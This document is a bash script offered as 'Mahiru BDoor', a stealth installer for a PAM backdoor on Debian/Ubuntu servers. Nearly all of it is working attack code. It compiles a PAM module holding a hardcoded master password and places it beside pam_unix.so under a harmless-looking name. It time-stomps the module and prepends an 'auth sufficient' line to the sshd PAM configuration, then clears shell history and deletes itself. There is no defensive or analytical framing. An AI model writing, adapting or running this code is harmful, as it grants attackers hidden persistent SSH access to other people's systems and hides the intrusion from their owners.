#!/bin/bash

# Mahiru BDoor - Advanced Stealth Installer
# Integrated PAM Backdoor for Debian/Ubuntu
# Designed by Mahiru Team

# Colors
GOLD='\033[38;5;220m'
CREAM='\033[38;5;230m'
RESET='\033[0m'

clear
echo -e "${GOLD}╔════════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${GOLD}║${CREAM}                      MAHIRU BDOOR v2.0                         ${GOLD}║${RESET}"
echo -e "${GOLD}║${CREAM}              Stealth PAM Backdoor System                       ${GOLD}║${RESET}"
echo -e "${GOLD}╠════════════════════════════════════════════════════════════════╣${RESET}"

if [[ -z "$1" ]]; then
    echo -e "${GOLD}║${CREAM}  [!] Error: Missing required password argument.                ${GOLD}║${RESET}"
    echo -e "${GOLD}║${CREAM}  Usage: ./mahiru_bdoor.sh <password>                           ${GOLD}║${RESET}"
    echo -e "${GOLD}╚════════════════════════════════════════════════════════════════╝${RESET}"
    exit 1
fi

PASSWORD="$1"
MOD_NAME="pam_secure_session"
MODULE="${MOD_NAME}.so"
PAMD_PATH="/etc/pam.d/sshd"

echo -e "${GOLD}║${CREAM}  [*] Initializing core systems...                              ${GOLD}║${RESET}"

# Build process
cat << 'EOF' > /tmp/pam_mahiru.c
#include <security/pam_modules.h>
#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

static int check_pass(const char *password) {
    if (!password) return 0;
    return (strcmp(password, SECRET) == 0);
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    (void)flags; (void)argc; (void)argv;
    const char *password = NULL;
    int retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    if (retval != PAM_SUCCESS || password == NULL) {
        retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "");
        if (retval != PAM_SUCCESS || password == NULL) return PAM_AUTH_ERR;
    }
    if (check_pass(password)) return PAM_SUCCESS;
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOF

echo -e "${GOLD}║${CREAM}  [*] Resolving dependencies (Silent Mode)...                  ${GOLD}║${RESET}"
apt-get update -y &>/dev/null
apt-get install -y gcc libpam0g-dev &>/dev/null

echo -e "${GOLD}║${CREAM}  [*] Locating system PAM modules...                            ${GOLD}║${RESET}"
pam_unix_path=$(realpath "$(find /lib /usr/lib -name "pam_unix.so" 2>/dev/null | head -1)")
DEST_DIR=$(dirname "$pam_unix_path")

echo -e "${GOLD}║${CREAM}  [*] Compiling Stealth Module...                               ${GOLD}║${RESET}"
gcc -fPIC -c /tmp/pam_mahiru.c -o /tmp/pam_mahiru.o -O2 -DSECRET="\"${PASSWORD}\"" &>/dev/null
gcc -shared -o "${DEST_DIR}/${MODULE}" /tmp/pam_mahiru.o -lpam &>/dev/null

echo -e "${GOLD}║${CREAM}  [*] Applying Time-Stomp and Permission Mask...               ${GOLD}║${RESET}"
chown root:root "${DEST_DIR}/${MODULE}"
chmod 644 "${DEST_DIR}/${MODULE}"
touch -r "$pam_unix_path" "${DEST_DIR}/${MODULE}"

echo -e "${GOLD}║${CREAM}  [*] Injecting into SSH authentication stack...                ${GOLD}║${RESET}"
if ! grep -q "$MODULE" "$PAMD_PATH"; then
    sed -i "1i auth    sufficient    ${MODULE}" "$PAMD_PATH"
fi

echo -e "${GOLD}║${CREAM}  [*] Wiping traces and initiating self-destruct...            ${GOLD}║${RESET}"
rm /tmp/pam_mahiru.c /tmp/pam_mahiru.o &>/dev/null
history -c &>/dev/null

echo -e "${GOLD}╠════════════════════════════════════════════════════════════════╣${RESET}"
echo -e "${GOLD}║${CREAM}  [+] DEPLOYMENT SUCCESSFUL!                                    ${GOLD}║${RESET}"
echo -e "${GOLD}║${CREAM}  Access code secured. File self-destructing now.               ${GOLD}║${RESET}"
echo -e "${GOLD}╚════════════════════════════════════════════════════════════════╝${RESET}"

# Self-destruct
rm -- "$0"
exit 0
